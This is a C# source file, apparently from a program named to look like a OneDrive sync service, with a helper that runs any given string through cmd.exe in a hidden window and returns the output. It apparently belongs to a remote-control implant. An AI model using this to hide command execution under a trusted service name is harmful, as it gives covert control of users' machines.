using System;
using System.Diagnostics;

namespace OneDriveSyncService
{
    internal class CMD
    {
        public static string Execute(string command)
        {
            try
            {
                string returns = "";

                Process cmdProc = PrepCmd(command);

                cmdProc.Start();

                returns += cmdProc.StandardOutput.ReadToEnd();
                returns += cmdProc.StandardError.ReadToEnd();

                return returns;
            }
            catch (Exception ex)
            {
                return ex.Message.ToString() + Environment.NewLine;
            }

        }

        static Process PrepCmd (string command)
        {
            Process cmdProc = new Process();
            cmdProc.StartInfo.FileName = "cmd.exe";
            cmdProc.StartInfo.Arguments = "/c " + command;
            cmdProc.StartInfo.UseShellExecute = false;
            cmdProc.StartInfo.CreateNoWindow = true;
            cmdProc.StartInfo.WorkingDirectory = Environment.CurrentDirectory;
            cmdProc.StartInfo.RedirectStandardOutput = true;
            cmdProc.StartInfo.RedirectStandardError = true;
            return cmdProc;
        }
    }
}
